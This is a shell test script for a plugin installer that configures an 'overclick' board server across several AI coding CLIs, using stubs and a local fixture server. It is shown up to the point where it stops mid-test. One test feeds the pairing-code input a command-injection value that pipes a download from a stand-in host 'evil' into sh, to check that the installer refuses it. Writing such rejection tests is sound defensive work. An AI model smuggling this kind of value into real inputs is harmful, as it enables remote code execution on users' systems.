#!/bin/sh
set -eu

REPO_ROOT=$(CDPATH='' cd -- "$(dirname -- "$0")/.." && pwd)
TEST_ROOT=$(mktemp -d)
stop_fixture_board() {
  [ -n "${FIXTURE_PID:-}" ] || return 0
  kill "$FIXTURE_PID" 2>/dev/null || true
  # Reap it, or the shell reports the signal as a job notice on stderr.
  wait "$FIXTURE_PID" 2>/dev/null || true
  FIXTURE_PID=""
}
trap 'stop_fixture_board; rm -rf -- "$TEST_ROOT"' EXIT
FIXTURE_URL=$(printf '%s%s%s' 'https' '://' 'fixture')

# Every plugin manifest ships the same version as package.json (OCL-105). The
# release guard in verify-release-version.sh only covers the package.json set,
# so the plugin manifests drifted to 0.1.12 while package.json was already at
# 0.2.1 — and .grok-plugin/marketplace.json advertised that stale version to
# every Grok user browsing the catalog. OCL-105 fixed the four manifests under
# plugin/ but missed .kimi-plugin/plugin.json — the top-level root manifest
# Kimi reads for a repository install (OCL-110) — leaving it free to drift the
# same way undetected.
PKG_VERSION=$(jq -r '.version' "$REPO_ROOT/package.json")
for manifest in plugin/plugin.json plugin/.claude-plugin/plugin.json \
  plugin/.codex-plugin/plugin.json plugin/kimi.plugin.json \
  .kimi-plugin/plugin.json; do
  jq -e --arg v "$PKG_VERSION" '.version == $v' "$REPO_ROOT/$manifest" >/dev/null ||
    { echo "$manifest is not at $PKG_VERSION" >&2; exit 1; }
done
for catalog in .grok-plugin/marketplace.json .claude-plugin/marketplace.json; do
  jq -e --arg v "$PKG_VERSION" 'all(.plugins[]; .version == $v)' "$REPO_ROOT/$catalog" >/dev/null ||
    { echo "$catalog is not at $PKG_VERSION" >&2; exit 1; }
done

jq -e '.skills and .mcpServers and (has("hooks") | not) and (has("commands") | not)' \
  "$REPO_ROOT/plugin/.codex-plugin/plugin.json" >/dev/null
jq -e '.skills and (.hooks | length == 6) and .commands' \
  "$REPO_ROOT/plugin/kimi.plugin.json" >/dev/null

# OCL-114. The package ships NO MCP server. A `${OVERCLICK_URL}` placeholder is
# never expanded by the CLIs, so every marketplace install used to hand the user
# an `overclick` server that could not connect - and, on a machine where a run
# had baked a fixture instance into these files, one that pointed at a host that
# does not exist. install.sh writes the resolved server into each CLI's own
# configuration instead, so the only thing the package can contribute is nothing.
for template in plugin/.mcp.json plugin/mcp_config.json plugin/.codex-plugin/mcp.json; do
  jq -e '.mcpServers | length == 0' "$REPO_ROOT/$template" >/dev/null ||
    { echo "$template must ship no MCP server" >&2; exit 1; }
done
jq -e 'has("mcpServers") | not' "$REPO_ROOT/plugin/kimi.plugin.json" >/dev/null
if grep -rq 'OVERCLICK_URL' "$REPO_ROOT/plugin"; then
  echo "the package still carries an unexpandable OVERCLICK_URL placeholder" >&2
  exit 1
fi
# Kimi finds a plugin root only in an archive root or a single child directory, so a
# repository install needs a root manifest pointing into ./plugin/. It carries no
# mcpServers: a registry install cannot know the instance URL, and Kimi drops an
# unresolvable url silently.
jq -e '(.skills | index("./plugin/skills/overclick")) and .commands == "./plugin/commands"
  and (.hooks | length == 6)
  and (.hooks | all(.command | startswith("node \"./plugin/hooks/") and endswith(".mjs\"")))
  and (has("mcpServers") | not)' \
  "$REPO_ROOT/.kimi-plugin/plugin.json" >/dev/null
jq -e '.hooks | keys | sort == ["PostToolUse", "PreToolUse", "SessionStart", "Stop"]' \
  "$REPO_ROOT/plugin/hooks/hooks.json" >/dev/null
jq -e '(.hooks.PostToolUse | length == 2) and (.hooks.PreToolUse | length == 2)' \
  "$REPO_ROOT/plugin/hooks/hooks.json" >/dev/null
# OCL-132. Claude Code on Windows without Git Bash runs hook commands through
# PowerShell, which cannot even parse `"${CLAUDE_PLUGIN_ROOT}"/hooks/x.sh` (the
# bare slash after the closing quote reads as a division operator) and has no
# bash to run the script anyway, so every hook died silently there. The whole
# path now lives inside the quotes and node — guaranteed on any Claude Code
# client — is the interpreter. antigravity.sh is the one shell script left: it
# is an install.sh-side dialect adapter, not a Claude Code hook.
jq -e '[.hooks[][].hooks[].command]
  | all(startswith("node \"${CLAUDE_PLUGIN_ROOT}/hooks/") and endswith(".mjs\""))' \
  "$REPO_ROOT/plugin/hooks/hooks.json" >/dev/null
for entrypoint in common claim-guard session-start stop-guard post-deliver pre-create; do
  test -f "$REPO_ROOT/plugin/hooks/$entrypoint.mjs"
done
test "$(find "$REPO_ROOT/plugin/hooks" -name '*.sh' | wc -l | tr -d ' ')" -eq 1
test "$(find "$REPO_ROOT/plugin/commands" -name '*.md' | wc -l | tr -d ' ')" -eq 5
test "$(find "$REPO_ROOT/plugin/skills" -name SKILL.md | wc -l | tr -d ' ')" -eq 1

# `stat -f` means "file mode" on BSD/macOS but "filesystem status" on GNU
# coreutils — where it SUCCEEDS and prints a multi-line filesystem block, so a
# `stat -f ... || stat -c ...` fallback never reaches the GNU form and `test`
# aborts with "Illegal number" (exit 2). Probe the GNU flag first: it is the one
# that fails cleanly on the other platform.
file_mode() {
  stat -c '%a' "$1" 2>/dev/null || stat -f '%Lp' "$1"
}

mkdir -p "$TEST_ROOT/bin" "$TEST_ROOT/home/.codex" "$TEST_ROOT/project"
# OCL-133. What a CLI reports as installed is a cache directory it materialized
# at some point, so the cache is where the installed VERSION can be read - and
# a cache left behind at the previous version is exactly the failure the
# installer now has to catch instead of printing "complete". Each fixture cache
# therefore carries a manifest, and its version is the variable under test.
stage_cache() {
  mkdir -p "$1/.claude-plugin"
  touch "$1/OVERCLICK.md"
  printf '{"name":"overclick","version":"%s","source":"./plugin"}\n' "$2" \
    >"$1/.claude-plugin/plugin.json"
}
stage_cache "$TEST_ROOT/claude-cache" "$PKG_VERSION"
stage_cache "$TEST_ROOT/codex-cache" "$PKG_VERSION"
# OCL-104 gave install.sh a `codex plugin list --json` materialization check to
# match the Claude one, but this stub only ever answered for claude, so codex
# verification saw empty output, install.sh exited 1, and this whole suite
# failed. Each CLI that install.sh verifies needs an answer here — its own
# shape: claude returns a flat array with installPath, codex an {installed: []}
# whose entries carry source.path.
cat >"$TEST_ROOT/bin/agent-stub" <<'SH'
#!/bin/sh
printf '%s:%s:%s\n' "$(basename -- "$0")" "${1:-}" "${2:-}" >>"$OC_TEST_NATIVE_LOG"
# The native managers resolve their own user scope from HOME, so what HOME was
# when they ran is the whole question a sandboxed install has to answer.
printf 'home:%s\n' "${HOME:-}" >>"$OC_TEST_NATIVE_LOG"
# `claude mcp add` and `grok mcp add` declare `-H, --header <header...>`, a
# VARIADIC option: it consumes every following argument that is not itself an
# option. Put the name and the URL after it and they become header values, and
# the command dies on "missing required argument 'name'" - which quiet_try
# reports as a step to confirm by hand, so the failure reads like a warning
# (OCL-114). Parse the way commander does, so the ordering stays under test.
if [ "${1:-}" = "mcp" ] && [ "${2:-}" = "add" ]; then
  shift 2
  positionals=0
  collecting=0
  url=""
  for argument in "$@"; do
    case "$argument" in
      --header|-H) collecting=1; continue ;;
      --transport|--scope|-s) collecting=0; skip_value=1; continue ;;
      -*) collecting=0; continue ;;
    esac
    if [ "${skip_value:-0}" = "1" ]; then skip_value=0; continue; fi
    if [ "$collecting" = "1" ]; then continue; fi
    positionals=$((positionals + 1))
    case "$argument" in http://*|https://*) url=$argument ;; esac
  done
  if [ "$positionals" -lt 2 ]; then
    echo "error: missing required argument 'name'" >&2
    exit 1
  fi
  printf 'mcp-url:%s\n' "$url" >>"$OC_TEST_NATIVE_LOG"
  exit 0
fi
# A board somebody already configured under this name. The real CLIs print the
# server they hold; an absent one is empty output here and a non-zero exit there.
if [ "${1:-}" = "mcp" ] && [ "${2:-}" = "get" ]; then
  [ -n "${OC_TEST_EXISTING_MCP:-}" ] && printf 'overclick: %s (HTTP)\n' "$OC_TEST_EXISTING_MCP"
fi
if [ "${1:-}" = "plugin" ] && [ "${2:-}" = "list" ]; then
  case "$(basename -- "$0")" in
    claude)
      printf '[{"id":"overclick@overclick","enabled":true,"installPath":"%s"}]' "$OC_TEST_CLAUDE_CACHE"
      ;;
    # OCL-104 gave Codex the same "ask the CLI what it holds" check Claude has,
    # in its own listing shape. Without an answer here the stub reports an
    # install that never materialized and the whole suite fails on that.
    codex)
      printf '{"installed":[{"name":"overclick","installed":true,"enabled":true,"source":{"path":"%s"}}]}' "$OC_TEST_CODEX_CACHE"
      ;;
  esac
fi
exit 0
SH
chmod +x "$TEST_ROOT/bin/agent-stub"
for cli in claude codex grok kimi; do
  ln -s agent-stub "$TEST_ROOT/bin/$cli"
done

# Antigravity's manager copies the directory it is handed into
# ~/.gemini/config/plugins/<name>, and install.sh then re-checks the mode of the
# credentials that landed in that second copy. A stub that only exits 0 would
# leave both the copy and that check untested, so it copies like the real one.
cat >"$TEST_ROOT/bin/agy" <<'SH'
#!/bin/sh
printf '%s:%s:%s\n' agy "${1:-}" "${2:-}" >>"$OC_TEST_NATIVE_LOG"
plugins="$OVERCLICK_INSTALL_HOME/.gemini/config/plugins"
case "${1:-}:${2:-}" in
  plugin:install)
    mkdir -p "$plugins/overclick"
    cp -R "$3/." "$plugins/overclick/"
    ;;
  plugin:list)
    [ -d "$plugins/overclick" ] && printf '{"imports":[{"name":"overclick","source":"antigravity"}]}'
    ;;
esac
exit 0
SH
chmod +x "$TEST_ROOT/bin/agy"

cat >"$TEST_ROOT/home/.codex/hooks.json" <<'JSON'
{
  "hooks": {
    "SessionStart": [
      {
        "matcher": "startup",
        "hooks": [{ "type": "command", "command": "existing-hook" }]
      }
    ]
  }
}
JSON

run_installer() {
  PATH="$TEST_ROOT/bin:$PATH" \
  OC_TEST_NATIVE_LOG="$TEST_ROOT/native.log" \
  OC_TEST_CLAUDE_CACHE="$TEST_ROOT/claude-cache" \
  OC_TEST_CODEX_CACHE="$TEST_ROOT/codex-cache" \
  OVERCLICK_INSTALL_HOME="$TEST_ROOT/home" \
  OVERCLICK_PROJECT_DIR="$TEST_ROOT/project" \
  OVERCLICK_INSTANCE_URL="$FIXTURE_URL" \
  OVERCLICK_TOKEN="fixture" \
  OVERCLICK_CLIS="claude,codex,grok,kimi,agy" \
    "$REPO_ROOT/install.sh" >"$TEST_ROOT/install.out" 2>"$TEST_ROOT/install.err"
}

run_installer
run_installer

if grep -q 'fixture' "$TEST_ROOT/install.out" "$TEST_ROOT/install.err"; then
  echo "installer exposed private input" >&2
  exit 1
fi

test "$(grep -c '<!-- overclick:start -->' "$TEST_ROOT/home/.claude/CLAUDE.md")" -eq 1
test "$(grep -c '^# overclick:start$' "$TEST_ROOT/home/.codex/config.toml")" -eq 1
test "$(grep -c 'existing-hook' "$TEST_ROOT/home/.codex/hooks.json")" -eq 1
test "$(grep -c 'session-start.mjs' "$TEST_ROOT/home/.codex/hooks.json")" -eq 1
test "$(grep -c 'claim-guard.mjs' "$TEST_ROOT/home/.codex/hooks.json" || true)" -eq 0
test "$(grep -c '^enforce_claim=0$' "$TEST_ROOT/home/.config/overclick/config")" -eq 1
test "$(grep -c '^token=' "$TEST_ROOT/home/.config/overclick/config")" -eq 1
test "$(file_mode "$TEST_ROOT/home/.config/overclick/config")" -eq 600

# Kimi has no non-interactive plugin subcommand, so install.sh writes its registry
# directly. Running twice must leave exactly one entry, and the installed copy must
# carry a resolved url: Kimi validates it and silently drops the server otherwise.
test "$(jq -r '[.plugins[] | select(.id == "overclick")] | length' \
  "$TEST_ROOT/home/.kimi-code/plugins/installed.json")" -eq 1
jq -e 'has("mcpServers") | not' \
  "$TEST_ROOT/home/.kimi-code/plugins/managed/overclick/kimi.plugin.json" >/dev/null
# Kimi discriminates MCP transports on "transport"; a "type" key is dropped and the
# transport re-inferred from the url, so declaring it is working by accident.
jq -e --arg url "$FIXTURE_URL/mcp" '.mcpServers.overclick.transport == "http"
  and .mcpServers.overclick.url == $url
  and (.mcpServers.overclick | has("type") | not)' \
  "$TEST_ROOT/home/.kimi-code/mcp.json" >/dev/null
test -f "$TEST_ROOT/home/.kimi-code/plugins/managed/overclick/hooks/claim-guard.mjs"

# Antigravity gets the package through its own manager, so what has to hold is
# what the manager ends up holding: the MCP shape it actually parses
# (serverUrl + headers, no "type"), a resolved url rather than the repository
# template, the rule pointing at the OVERCLICK.md that exists on disk, and a
# second copy of the credentials that is no more readable than the first.
agy_plugin="$TEST_ROOT/home/.gemini/config/plugins/overclick"
jq -e '(.mcpServers.overclick.serverUrl | startswith("$") | not)
  and .mcpServers.overclick.headers.Authorization
  and (.mcpServers.overclick | has("type") | not)' \
  "$agy_plugin/mcp_config.json" >/dev/null
test "$(file_mode "$agy_plugin/mcp_config.json")" -eq 600
test "$(grep -c '<!-- overclick:start -->' "$agy_plugin/rules/AGENTS.md")" -eq 1
grep -Fq "$agy_plugin/OVERCLICK.md" "$agy_plugin/rules/AGENTS.md"
test -f "$agy_plugin/OVERCLICK.md"
test -x "$agy_plugin/hooks/antigravity.sh"
jq -e '.overclick | (.PreToolUse | length == 2) and (.PostToolUse | length == 1)
  and .PreInvocation and .Stop' "$agy_plugin/hooks.json" >/dev/null
# The repository package stays a generic template: only the installed copy is
# allowed to carry an instance.
jq -e '.mcpServers | length == 0' "$REPO_ROOT/plugin/mcp_config.json" >/dev/null

# OCL-114: every copy the installer leaves behind, other than the Antigravity
# one above and each CLI's own config, must be free of a server entry - so no
# CLI can end up with two `overclick` servers, and no dead one can survive in a
# marketplace directory after the instance it was baked from is gone.
for copy in \
  "$TEST_ROOT/home/.config/overclick/plugin" \
  "$TEST_ROOT/home/.config/overclick/native-marketplace/plugin" \
  "$TEST_ROOT/home/.config/overclick/codex-marketplace/plugins/overclick"; do
  jq -e '.mcpServers | length == 0' "$copy/.mcp.json" >/dev/null ||
    { echo "$copy/.mcp.json declares a duplicate MCP server" >&2; exit 1; }
  jq -e 'has("mcpServers") | not' "$copy/kimi.plugin.json" >/dev/null ||
    { echo "$copy/kimi.plugin.json declares a duplicate MCP server" >&2; exit 1; }
  if grep -Rq 'fixture' "$copy/.mcp.json" "$copy/kimi.plugin.json"; then
    echo "$copy still carries baked credentials" >&2
    exit 1
  fi
done

# The one registration Claude gets has to be the resolved instance, and it has
# to be written through Claude's own manager rather than into the package.
grep -Fq "mcp-url:$FIXTURE_URL/mcp" "$TEST_ROOT/native.log"
# quiet_try turns a failed registration into a line that reads like advice, so
# the absence of that line is the only thing that says the server was really
# registered.
if grep -Fq 'Claude MCP needs manual confirmation' "$TEST_ROOT/install.err"; then
  echo "the Claude MCP registration failed" >&2
  exit 1
fi
grep -Fq 'Claude MCP configured.' "$TEST_ROOT/install.out"
# A sandboxed install must not reach the operator's real configuration: the
# native managers resolve their user scope from HOME, so HOME has to follow
# OVERCLICK_INSTALL_HOME (OCL-114).
grep -Fq "home:$TEST_ROOT/home" "$TEST_ROOT/native.log"

# A PreToolUse hook that answers with an empty object is read by Antigravity as
# a denial, so the adapter has to speak on every path — including the one where
# there is no JSON runtime to read the payload with at all. That branch is only
# reachable with python3 and node off PATH, which is why it gets its own PATH.
mkdir -p "$TEST_ROOT/nojson"
for utility in sh grep sed tr cat dirname printf git; do
  target=$(command -v "$utility" 2>/dev/null) && ln -sf "$target" "$TEST_ROOT/nojson/$utility"
done
agy_hook() { (cd "$agy_plugin" && printf '%s' "$3" | PATH="$1" sh ./hooks/antigravity.sh "$2"); }
for agy_path in "$PATH" "$TEST_ROOT/nojson"; do
  printf '%s' "$(agy_hook "$agy_path" pre-tool 'not json')" | grep -Fq '"decision":'
  printf '%s' "$(agy_hook "$agy_path" pre-tool '{"toolCall":{"name":"run_command","args":{"CommandLine":"ls"}}}')" |
    grep -Fq '"decision":"allow"'
done
printf '%s' "$(agy_hook "$PATH" pre-invocation '{"invocationNum":3}')" | grep -Fq '{}'

sed -i.bak 's/enforce_claim=0/enforce_claim=1/' "$TEST_ROOT/home/.config/overclick/config"
run_installer
test "$(grep -c '^enforce_claim=1$' "$TEST_ROOT/home/.config/overclick/config")" -eq 1

# "Successfully installed" is not proof of anything: a marketplace entry that
# never fetched its package still exits 0. The installer must ask the CLI
# what it actually has on disk and fail loudly when that comes up empty.
mkdir -p "$TEST_ROOT/claude-cache-empty"
if PATH="$TEST_ROOT/bin:$PATH" \
  OC_TEST_NATIVE_LOG="$TEST_ROOT/native-unverified.log" \
  OC_TEST_CLAUDE_CACHE="$TEST_ROOT/claude-cache-empty" \
  OC_TEST_CODEX_CACHE="$TEST_ROOT/codex-cache" \
  OVERCLICK_INSTALL_HOME="$TEST_ROOT/home-unverified" \
  OVERCLICK_PROJECT_DIR="$TEST_ROOT/project" \
  OVERCLICK_INSTANCE_URL="$FIXTURE_URL" \
  OVERCLICK_TOKEN="fixture" \
  OVERCLICK_CLIS="claude" \
    "$REPO_ROOT/install.sh" >"$TEST_ROOT/unverified.out" 2>"$TEST_ROOT/unverified.err"; then
  echo "installer should fail loudly when the Claude plugin never materializes" >&2
  exit 1
fi
grep -Fq 'did not materialize' "$TEST_ROOT/unverified.err"

# OCL-133. The other half of that lie: the plugin DID materialize, the
# marketplace was bumped, and the CLI kept serving the cached previous version -
# and the installer signed it off as verified/complete. The version that
# materialized is the only thing that settles it.
grep -Fq "Claude plugin verified: $PKG_VERSION" "$TEST_ROOT/install.out"
grep -Fq "Codex plugin verified: $PKG_VERSION" "$TEST_ROOT/install.out"
grep -Fq "Antigravity plugin verified: $PKG_VERSION" "$TEST_ROOT/install.out"
# Every re-run has to push the CLI's own update through, or an install over an
# older version leaves the old one installed: `marketplace add` and `plugin
# install` both succeed as no-ops, so the `||` fallback never fired.
grep -Fq 'claude:plugin:marketplace' "$TEST_ROOT/native.log"
test "$(grep -c '^claude:plugin:update$' "$TEST_ROOT/native.log")" -ge 1

mkdir -p "$TEST_ROOT/claude-cache-stale"
stage_cache "$TEST_ROOT/claude-cache-stale" 0.0.1
if PATH="$TEST_ROOT/bin:$PATH" \
  OC_TEST_NATIVE_LOG="$TEST_ROOT/native-stale.log" \
  OC_TEST_CLAUDE_CACHE="$TEST_ROOT/claude-cache-stale" \
  OC_TEST_CODEX_CACHE="$TEST_ROOT/codex-cache" \
  OVERCLICK_INSTALL_HOME="$TEST_ROOT/home-stale" \
  OVERCLICK_PROJECT_DIR="$TEST_ROOT/project" \
  OVERCLICK_INSTANCE_URL="$FIXTURE_URL" \
  OVERCLICK_TOKEN="fixture" \
  OVERCLICK_CLIS="claude" \
    "$REPO_ROOT/install.sh" >"$TEST_ROOT/stale.out" 2>"$TEST_ROOT/stale.err"; then
  echo "installer reported success while the CLI stayed on the previous version" >&2
  exit 1
fi
grep -Fq "is still on 0.0.1 after installing $PKG_VERSION" "$TEST_ROOT/stale.err"
if grep -Fq 'installation complete' "$TEST_ROOT/stale.out"; then
  echo "installer printed complete on a stale version" >&2
  exit 1
fi

# `curl | bash` never gives install.sh a local checkout to reuse (OCL-103: the
# github source was never the bug). Exercise that path directly: a bare install.sh copy, no plugin/ next
# to it, sourcing a local git remote instead of network github.
mkdir -p "$TEST_ROOT/plugin-remote/plugin/.codex-plugin" \
  "$TEST_ROOT/plugin-remote/plugin/.claude-plugin" \
  "$TEST_ROOT/plugin-remote/.claude-plugin" "$TEST_ROOT/plugin-remote/.grok-plugin"
git init -q "$TEST_ROOT/plugin-remote"
git -C "$TEST_ROOT/plugin-remote" config user.name fixture
git -C "$TEST_ROOT/plugin-remote" config user.email fixture@invalid
printf 'package v1\n' >"$TEST_ROOT/plugin-remote/plugin/OVERCLICK.md"
printf '{}' >"$TEST_ROOT/plugin-remote/plugin/.codex-plugin/plugin.json"
# The installer refuses a package that will not say which version it is, since
# nothing downstream could then assert that the version materialized (OCL-133).
printf '{"name":"overclick","version":"9.9.9"}' \
  >"$TEST_ROOT/plugin-remote/plugin/.claude-plugin/plugin.json"
printf '{}' >"$TEST_ROOT/plugin-remote/.claude-plugin/marketplace.json"
printf '{}' >"$TEST_ROOT/plugin-remote/.grok-plugin/marketplace.json"
git -C "$TEST_ROOT/plugin-remote" add -A
git -C "$TEST_ROOT/plugin-remote" commit -q -m v1

mkdir -p "$TEST_ROOT/isolated-installer" "$TEST_ROOT/clone-cache"
cp "$REPO_ROOT/install.sh" "$TEST_ROOT/isolated-installer/install.sh"
chmod +x "$TEST_ROOT/isolated-installer/install.sh"
stage_cache "$TEST_ROOT/clone-cache" 9.9.9

run_clone_installer() {
  PATH="$TEST_ROOT/bin:$PATH" \
  OC_TEST_NATIVE_LOG="$TEST_ROOT/clone-native.log" \
  OC_TEST_CLAUDE_CACHE="$TEST_ROOT/clone-cache" \
  OC_TEST_CODEX_CACHE="$TEST_ROOT/codex-cache" \
  OVERCLICK_INSTALL_HOME="$TEST_ROOT/clone-home" \
  OVERCLICK_PROJECT_DIR="$TEST_ROOT/project" \
  OVERCLICK_INSTANCE_URL="$FIXTURE_URL" \
  OVERCLICK_TOKEN="fixture" \
  OVERCLICK_CLIS="claude" \
  OVERCLICK_PLUGIN_SOURCE="file://$TEST_ROOT/plugin-remote" \
    "$TEST_ROOT/isolated-installer/install.sh" >"$TEST_ROOT/clone.out" 2>"$TEST_ROOT/clone.err"
}

run_clone_installer
plugin_src="$TEST_ROOT/clone-home/.config/overclick/plugin-src"
test -d "$plugin_src/.git"
grep -Fq 'package v1' "$plugin_src/plugin/OVERCLICK.md"

printf 'package v2\n' >"$TEST_ROOT/plugin-remote/plugin/OVERCLICK.md"
git -C "$TEST_ROOT/plugin-remote" add -A
git -C "$TEST_ROOT/plugin-remote" commit -q -m v2

run_clone_installer
grep -Fq 'package v2' "$plugin_src/plugin/OVERCLICK.md"

OVERCLICK_INSTALL_HOME="$TEST_ROOT/home-fallback" \
OVERCLICK_PROJECT_DIR="$TEST_ROOT/project" \
OVERCLICK_INSTANCE_URL="$FIXTURE_URL" \
OVERCLICK_TOKEN="fixture" \
OVERCLICK_CLIS="other" \
  "$REPO_ROOT/install.sh" >"$TEST_ROOT/fallback.out" 2>"$TEST_ROOT/fallback.err"
OVERCLICK_INSTALL_HOME="$TEST_ROOT/home-fallback" \
OVERCLICK_PROJECT_DIR="$TEST_ROOT/project" \
OVERCLICK_INSTANCE_URL="$FIXTURE_URL" \
OVERCLICK_TOKEN="fixture" \
OVERCLICK_CLIS="other" \
  "$REPO_ROOT/install.sh" >"$TEST_ROOT/fallback.out" 2>"$TEST_ROOT/fallback.err"
test "$(grep -c '<!-- overclick:start -->' "$TEST_ROOT/project/AGENTS.md")" -eq 1

# A pairing code, not a token (OCL-102). The board prints six digits inside the
# copyable command and the installer trades them on /api/pair for the real
# bearer value, so nothing anyone can read off a shared screen is worth having.
# The stub answers the way the route does; what is under test is that the token
# reaches the private config and reaches no output.
mkdir -p "$TEST_ROOT/pair-bin"
cat >"$TEST_ROOT/pair-bin/curl" <<'SH'
#!/bin/sh
# exchange_pairing_code now calls `curl -sS -o <file> -w '%{http_code}'`: the
# body lands in the -o file and only the HTTP status is on stdout. Emulate that
# contract, not the old "print the body on stdout" one, or the exchange reads
# the JSON as a status, falls to the refusal branch, and the install exits 1.
url=""
body=""
out=""
previous=""
for argument in "$@"; do
  case "$argument" in
    http://*|https://*) url=$argument ;;
  esac
  case "$previous" in
    -d) body=$argument ;;
    -o) out=$argument ;;
  esac
  previous=$argument
done
printf '%s %s\n' "$url" "$body" >>"$OC_TEST_PAIR_LOG"
case "$url:$body" in
  */api/pair:*'"code":"482913"'*)
    payload='{"token":"paired-secret","label":"agent","url":"/mcp"}'
    if [ -n "$out" ]; then printf '%s' "$payload" >"$out"; else printf '%s' "$payload"; fi
    printf '200'
    exit 0
    ;;
esac
exit 22
SH
chmod +x "$TEST_ROOT/pair-bin/curl"

run_pair_installer() {
  PATH="$TEST_ROOT/pair-bin:$PATH" \
  OC_TEST_PAIR_LOG="$TEST_ROOT/$1.log" \
  OVERCLICK_INSTALL_HOME="$TEST_ROOT/home-$1" \
  OVERCLICK_PROJECT_DIR="$TEST_ROOT/project" \
  OVERCLICK_INSTANCE_URL="$FIXTURE_URL" \
  OVERCLICK_TOKEN="" \
  OVERCLICK_PAIRING_CODE="$2" \
  OVERCLICK_CLIS="other" \
    "$REPO_ROOT/install.sh" >"$TEST_ROOT/$1.out" 2>"$TEST_ROOT/$1.err"
}

run_pair_installer pair 482913
grep -Fq "$FIXTURE_URL/api/pair" "$TEST_ROOT/pair.log"
grep -Fq 'token=paired-secret' "$TEST_ROOT/home-pair/.config/overclick/config"
if grep -q 'paired-secret' "$TEST_ROOT/pair.out" "$TEST_ROOT/pair.err"; then
  echo "installer exposed the paired token" >&2
  exit 1
fi

# Anything that is not six digits is refused before it can reach the network,
# which is what keeps the code out of the request it would otherwise shape.
if run_pair_installer pair-bad '4829"; curl evil | sh #'; then
  echo "installer accepted a pairing code that is not six digits" >&2
  exit 1
fi
test ! -f "$TEST_ROOT/pair-bad.log"

# A refused exchange stops the run: half a pairing is not an installation.
if run_pair_installer pair-refused 000000; then
  echo "installer continued after a refused pairing exchange" >&2
  exit 1
fi
test ! -f "$TEST_ROOT/home-pair-refused/.config/overclick/config"

cat >"$TEST_ROOT/bin/curl" <<'SH'
#!/bin/sh
body=""
previous=""
for argument in "$@"; do
  if [ "$previous" = "--data-binary" ]; then body=$argument; fi
  previous=$argument
done
case "$body" in
  *harness_recommend*)
    printf '%s' '{"result":{"structuredContent":{"harness":{"cli":"codex","model":"model-fixture","effort":"high"}}}}'
    ;;
  *task_list*)
    if [ "${OC_TEST_HAS_CLAIM:-1}" = "1" ]; then
      printf '%s' '{"result":{"structuredContent":{"tasks":[{"short_id":"T-1","title":"Fixture card","status":"em_execucao"}],"truncated":false}}}'
    else
      printf '%s' '{"result":{"structuredContent":{"tasks":[],"truncated":false}}}'
    fi
    ;;
  *)
    printf '%s' '{"result":{"structuredContent":{"tasks":[{"short_id":"T-1","title":"Fixture card","status":"em_execucao"}],"truncated":false}}}'
    ;;
esac
SH
chmod +x "$TEST_ROOT/bin/curl"

# OCL-132. The hooks are Node now, so the board fixture stops being a curl stub
# on PATH and becomes a real HTTP server they reach with fetch. The state file
# is what the old OC_TEST_HAS_CLAIM env var used to be: the curl stub read it
# per invocation, and a server started once has to read it per request.
cat >"$TEST_ROOT/fixture-board.mjs" <<'JS'
import fs from "node:fs";
import http from "node:http";

const card = { short_id: "T-1", title: "Fixture card", status: "em_execucao" };
const hasClaim = () => {
  try {
    return fs.readFileSync(process.env.OC_FIXTURE_STATE, "utf8").trim() !== "0";
  } catch {
    return true;
  }
};

http
  .createServer((request, response) => {
    let raw = "";
    request.on("data", (chunk) => {
      raw += chunk;
    });
    request.on("end", () => {
      // The hook has to authenticate. An unauthenticated call is the board
      // refusing, not a fixture shortcut.
      if (request.headers.authorization !== "Bearer fixture") {
        response.writeHead(401).end("{}");
        return;
      }
      let body;
      if (raw.includes("harness_recommend")) {
        body = {
          result: {
            structuredContent: {
              harness: { cli: "codex", model: "model-fixture", effort: "high" },
            },
          },
        };
      } else if (raw.includes("task_list") && !hasClaim()) {
        body = { result: { structuredContent: { tasks: [], truncated: false } } };
      } else {
        body = { result: { structuredContent: { tasks: [card], truncated: false } } };
      }
      response.writeHead(200, { "Content-Type": "application/json" });
      response.end(JSON.stringify(body));
    });
  })
  .listen(0, "127.0.0.1", function listening() {
    fs.writeFileSync(process.env.OC_FIXTURE_PORT, String(this.address().port));
  });
JS

FIXTURE_STATE="$TEST_ROOT/fixture-has-claim"
FIXTURE_PORT_FILE="$TEST_ROOT/fixture-port"
printf '1' >"$FIXTURE_STATE"
has_claim() { printf '%s' "$1" >"$FIXTURE_STATE"; }

OC_FIXTURE_STATE="$FIXTURE_STATE" OC_FIXTURE_PORT="$FIXTURE_PORT_FILE" \
  node "$TEST_ROOT/fixture-board.mjs" &
FIXTURE_PID=$!
waited=0
while [ ! -s "$FIXTURE_PORT_FILE" ]; do
  waited=$((waited + 1))
  test "$waited" -lt 150 || { echo "the fixture board never came up" >&2; exit 1; }
  sleep 0.1
done
FIXTURE_PORT=$(cat "$FIXTURE_PORT_FILE")

HOOK_CONFIG="$TEST_ROOT/hook-config"
cat >"$HOOK_CONFIG" <<EOF
url=http://127.0.0.1:$FIXTURE_PORT/mcp
token=fixture
enforce_stop=0
enforce_harness=0
enforce_claim=0
EOF

# The point of the port: no jq, no python3, no curl, no shell utility. Every
# hook below runs against a PATH holding nothing but node.
mkdir -p "$TEST_ROOT/nodeonly"
ln -s "$(command -v node)" "$TEST_ROOT/nodeonly/node"
HOOK_PATH="$TEST_ROOT/nodeonly"

snapshot=$(PATH="$HOOK_PATH" OVERCLICK_CONFIG_FILE="$HOOK_CONFIG" node "$REPO_ROOT/plugin/hooks/session-start.mjs")
printf '%s' "$snapshot" | grep -q 'T-1'
printf '%s' "$snapshot" | grep -q 'OverClick board snapshot'

# A board the hook cannot authenticate against says nothing at all, rather than
# leaking an HTTP error into the session transcript.
cat >"$TEST_ROOT/hook-config-bad-token" <<EOF
url=http://127.0.0.1:$FIXTURE_PORT/mcp
token=wrong
EOF
test -z "$(PATH="$HOOK_PATH" OVERCLICK_CONFIG_FILE="$TEST_ROOT/hook-config-bad-token" node "$REPO_ROOT/plugin/hooks/session-start.mjs")"

test -z "$(PATH="$HOOK_PATH" OVERCLICK_CONFIG_FILE="$HOOK_CONFIG" node "$REPO_ROOT/plugin/hooks/stop-guard.mjs")"
sed -i.bak 's/enforce_stop=0/enforce_stop=1/' "$HOOK_CONFIG"
stop_result=$(PATH="$HOOK_PATH" OVERCLICK_CONFIG_FILE="$HOOK_CONFIG" node "$REPO_ROOT/plugin/hooks/stop-guard.mjs")
printf '%s' "$stop_result" | grep -q '"decision":"block"'

sed -i.bak 's/enforce_harness=0/enforce_harness=1/' "$HOOK_CONFIG"
matching_input='{"tool_input":{"type":"feature","harness":{"cli":"codex","model":"model-fixture","effort":"high"}}}'
